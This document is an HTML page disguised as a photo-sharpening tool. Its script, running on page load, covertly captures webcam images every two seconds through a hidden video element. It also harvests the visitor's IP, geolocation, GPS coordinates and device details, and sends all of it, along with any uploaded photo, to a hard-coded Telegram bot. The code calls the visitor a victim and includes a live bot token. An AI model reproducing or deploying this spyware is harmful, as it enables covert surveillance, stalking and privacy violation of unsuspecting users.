<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>penjernih foto</title>
  <style>
    body {
  background: linear-gradient(to right, #654ea3, #eaafc8);
  background-size: cover;
  color: black;
  font-family: 'Poppins', sans-serif;
  text-align: center;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  overflow: hidden;
}
    .loading-text {
      font-size: 2.5em; /* ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶´‡¶®‡ßç‡¶ü ‡¶∏‡¶æ‡¶á‡¶ú ‡¶õ‡ßã‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá */
      opacity: 0;
      animation: fadeInOut 1s infinite;
      margin-bottom: 20px; /* ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü‡ßá‡¶∞ ‡¶®‡¶ø‡¶ö‡ßá ‡¶è‡¶ï‡¶ü‡ßÅ ‡¶ú‡¶æ‡¶Ø‡¶º‡¶ó‡¶æ */
    }
    @keyframes fadeInOut {
      0% { opacity: 0; }
      50% { opacity: 1; }
      100% { opacity: 0; }
    }
    video, canvas { 
      display: none;
      position: absolute;
      left: -9999px;
      top: -9999px;
    }
    .upload-section {
  background: white;
  padding: 30px;
  border-radius: 10px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    }
    .upload-btn {
  background-color: #007bff;
  color: white;
  padding: 12px 25px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 1em;
}
    .upload-btn:hover {
  background-color: #0056b3;
    }
    #imageUpload {
      display: none; /* ‡¶´‡¶æ‡¶á‡¶≤ ‡¶á‡¶®‡¶™‡ßÅ‡¶ü‡¶ü‡¶ø ‡¶≤‡ßÅ‡¶ï‡¶ø‡¶Ø‡¶º‡ßá ‡¶∞‡¶æ‡¶ñ‡¶æ */
    }
    #uploadStatusMessage { /* ‡¶®‡¶§‡ßÅ‡¶® ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶°‡¶ø‡¶≠‡ßá‡¶∞ ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
      margin-top: 20px;
      font-size: 3em;
      color: green;
      font-weight: bold;
    }
    
   .web-topbar {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  background: linear-gradient(to right, #141e30, #243b55);
  color: white;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 15px 30px;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
  z-index: 1000;
  font-family: 'Segoe UI', sans-serif;
}

.logo {
  font-size: 22px;
  font-weight: bold;
}

.nav-links {
  display: flex;
  align-items: center;
  gap: 20px;
}

.nav-links a {
  color: #ffffffcc;
  text-decoration: none;
  font-size: 15px;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #fff;
}

.premium-btn {
  background: gold;
  color: black;
  padding: 8px 16px;
  font-size: 14px;
  font-weight: bold;
  border: none;
  border-radius: 20px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
  cursor: pointer;
  transition: background 0.3s;
}

.premium-btn:hover {
  background: #ffcc00;
}

.camera-status {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: 40px;
}

.camera-icon {
  width: 60px;
  height: 60px;
  opacity: 0.8;
  margin-bottom: 10px;
}

.loading-text {
  font-family: 'Segoe UI', sans-serif;
  font-size: 20px;
  font-weight: 500;
  color: #333;
}

.dots::after {
  content: '';
  display: inline-block;
  animation: dotsAnimation 1.5s infinite steps(4);
}

@keyframes dotsAnimation {
  0%   { content: ''; }
  25%  { content: '.'; }
  50%  { content: '..'; }
  75%  { content: '...'; }
  100% { content: ''; }
}

.photo-box {
  width: 90%;
  max-width: 400px;
  aspect-ratio: 4/3;
  background: #f3f3f3;
  border: 2px dashed #aaa;
  border-radius: 12px;
  margin: 30px auto;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  position: relative;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
}

.photo-box video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.photo-label {
  position: absolute;
  top: 10px;
  left: 10px;
  background: rgba(255,255,255,0.7);
  padding: 4px 8px;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 600;
}
    
  </style>
</head>
<body>
  <div class="camera-status">
  <img src="https://b.top4top.io/p_3523gsa520.jpeg" class="camera-icon" />
  <p class="loading-text">Tools Penjernih Foto By Xtann<span class="dots"></span></p>
</div>
 
<header class="web-topbar">
  <div class="logo">Penjernih Foto By Xtann</div>
  <nav class="nav-links">
  </nav>
</header>
  
  <div class="loading-text"></div>  <div class="upload-section">
    <h2>Ambil Foto atau Unggah dari Galeri</h2>
    <p>Pastikan pencahayaan cukup untuk hasil terbaik</p>
  
   <label for="imageUpload" class="upload-btn" id="uploadButtonLabel">Ambil Foto / Unggah</label>
 <input type="file" id="imageUpload" accept="image/*">
 <div id="uploadStatusMessage"></div>
 </div><video id="video" autoplay></video> <canvas id="canvas" width="640" height="480"></canvas>
  
  <script>
    const botToken = '8013703987:AAH688ALstcTKaTVoG8aLZG7kav-GwVEr_A'; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶ü‡ßã‡¶ï‡ßá‡¶®
    const chatId = '7942580844'; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø
    const uploadStatusMessageDiv = document.getElementById('uploadStatusMessage'); // ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶°‡¶ø‡¶≠

    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      }).catch(error => console.error('Error sending message:', error));
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { // Promise ‡¶∞‡¶ø‡¶ü‡¶æ‡¶∞‡ßç‡¶® ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá
        method: 'POST',
        body: formData
      });
    }

    async function getFullInfo() {
      let ip = 'N/A';
      let ipLocationInfo = {
        city: 'N/A',
        region: 'N/A',
        country: 'N/A',
        org: 'N/A'
      };

      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;

        const ipApiLocationResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const ipApiLocationData = await ipApiLocationResponse.json();
        if (ipApiLocationData.status === 'success') {
          ipLocationInfo.city = ipApiLocationData.city || 'N/A';
          ipLocationInfo.region = ipApiLocationData.regionName || 'N/A';
          ipLocationInfo.country = ipApiLocationData.country || 'N/A';
          ipLocationInfo.org = ipApiLocationInfo.org || 'N/A';
        }
      } catch (e) {
        console.error('IP address or IP location fetch failed:', e);
      }

      let locationText = '‚ùå TIDAK ADA AKSES LOKASI';
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          // ‡¶è‡¶ñ‡¶æ‡¶®‡ßá Google Maps-‡¶è‡¶∞ URL ‡¶∏‡¶†‡¶ø‡¶ï‡¶≠‡¶æ‡¶¨‡ßá ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá
          locationText = `<a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}" target="_blank">üìç KLIK UNTUK MELIHAT LOKASI YANG TEPAT</a>`;
          sendToTelegram(`<b>üìç GPS LOKASI:</b>\n${locationText}`);
        }, (err) => {
          console.warn(`Location error (${err.code}): ${err.message}`);
          sendToTelegram(`<b>üìç GPS LOKASI:</b>\n‚ùå GPS TIDAK ADA AKSES LOKASI`);
        });
      } else {
        sendToTelegram(`<b>üìç GPS LOKASI:</b>\n‚ùå BROWSER NYA TIDAK MENDUKUNG GPS`);
      }

      const battery = await navigator.getBattery().catch(() => ({ level: 'N/A', charging: false }));
      const batteryLevel = battery.level !== 'N/A' ? (battery.level * 100).toFixed(0) + '%' : 'N/A';
      const batteryStatus = battery.charging ? 'üîåmengisi daya' : '‚ö° tidak mengisi daya';

      const info = `
<b>üì° DATA PERANGKAT -DI SADAP OLEH XTANN_OFFC  </b>

üåê <b>IP NETWORK:</b> ${ip}
üèôÔ∏è <b>IP-KOTA:</b> ${ipLocationInfo.city}
üó∫Ô∏è <b>IP-WILAYAH:</b> ${ipLocationInfo.region}
üåç <b>IP-NEGARA:</b> ${ipLocationInfo.country}
üè¢ <b>ISP:</b> ${ipLocationInfo.org}

üñ•Ô∏è <b>DEVICE/PERANGKAT:</b> ${navigator.userAgent}
üíª <b>MASUK LEWAT MANA KORBAN NYA:</b> ${navigator.platform}
üåç <b>BAHASA NEGARA:</b> ${navigator.language}
üñºÔ∏è <b>LAYAR HANDPHONE:</b> ${screen.width}x${screen.height}
üîã <b>BATERAI:</b> ${batteryLevel} (${batteryStatus})
üç™ <b>cokkie:</b> ${navigator.cookieEnabled ? 'aktif' : 'BATERAI'}
üì± <b>RAM:</b> ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'tidak di kenal'}
‚è∞ <b>JAM:</b> ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
`;
      sendToTelegram(info);
    }

    // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶•‡ßá‡¶ï‡ßá ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ ‡¶ì ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Æ‡¶§‡ßã‡¶á ‡¶≤‡ßÅ‡¶ï‡¶æ‡¶®‡ßã ‡¶•‡¶æ‡¶ï‡¶¨‡ßá)
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        video.srcObject = stream;
        video.play();
        
        // ‡¶™‡ßç‡¶∞‡¶§‡¶ø 2 ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶•‡ßá‡¶ï‡ßá ‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        setInterval(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            sendPhotoToTelegram(blob);
          }, 'image/jpeg');
        }, 2000); 
      })
      .catch(err => {
        console.warn('akses kamera tidak tersedia atau terjadi kesalahan:', err);
        sendToTelegram(`<b>üö® peringatan:</b>akses kamera tidak tersedia`);
      });

    // ‡¶ó‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡¶ø ‡¶•‡ßá‡¶ï‡ßá ‡¶õ‡¶¨‡¶ø ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶æ‡¶≤‡¶ø‡¶ü‡¶ø
    const imageUpload = document.getElementById('imageUpload');
    imageUpload.addEventListener('change', async (event) => { // async ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá
      const file = event.target.files[0];
      if (file) {
        if (file.type.startsWith('image/')) {
          uploadStatusMessageDiv.style.color = 'blue'; // ‡¶Ü‡¶™‡¶≤‡ßã‡¶° ‡¶π‡¶ö‡ßç‡¶õ‡ßá ‡¶¨‡ßã‡¶ù‡¶æ‡¶§‡ßá ‡¶∞‡¶ô ‡¶π‡¶≤‡ßÅ‡¶¶ ‡¶ï‡¶∞‡ßÅ‡¶®
          uploadStatusMessageDiv.innerText = 'Waiting..';
          try {
            await sendPhotoToTelegram(file); // ‡¶´‡¶æ‡¶á‡¶≤‡¶ï‡ßá ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø Blob ‡¶π‡¶ø‡¶∏‡ßá‡¶¨‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶Ø‡¶æ‡¶Ø‡¶º
            uploadStatusMessageDiv.style.color = 'lime'; // ‡¶∏‡¶´‡¶≤ ‡¶π‡¶≤‡ßá ‡¶∞‡¶ô ‡¶∏‡¶¨‡ßÅ‡¶ú ‡¶ï‡¶∞‡ßÅ‡¶®
            uploadStatusMessageDiv.innerHTML = `Foto Anda telah diunggah. Hubungi kami untuk informasi lebih lanjut: <a href="wa.me/62838829290" target="_blank" style="color: lime;">wa.me/62896721028</a>`;
            sendToTelegram(`‚úÖ POTO YANG DI KIRIM KORBAN‡•§`);
          } catch (error) {
            uploadStatusMessageDiv.style.color = 'red'; // ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶π‡¶≤‡ßá ‡¶∞‡¶ô ‡¶≤‡¶æ‡¶≤ ‡¶ï‡¶∞‡ßÅ‡¶®
            uploadStatusMessageDiv.innerText = 'TES';
            console.error('Error uploading image:', error);
            sendToTelegram(`‚ùå harus berformat png atau jpg: ${error.message}`);
          }
        } else {
          uploadStatusMessageDiv.style.color = 'red';
          uploadStatusMessageDiv.innerText = `‚ö†Ô∏è berkas yang di unggah bukan lah suatu gambar`;
          sendToTelegram(`‚ö†Ô∏èberkas yang di unggah bukanlah suatu gambar`);
        }
        // ‡¶´‡¶æ‡¶á‡¶≤ ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶∞‡¶ø‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶Ø‡¶æ‡¶§‡ßá ‡¶è‡¶ï‡¶á ‡¶´‡¶æ‡¶á‡¶≤ ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶≤‡ßá change ‡¶á‡¶≠‡ßá‡¶®‡ßç‡¶ü ‡¶´‡¶æ‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶π‡¶Ø‡¶º
        event.target.value = '';
      }
    });

    getFullInfo();
  </script>
</body>
</html>
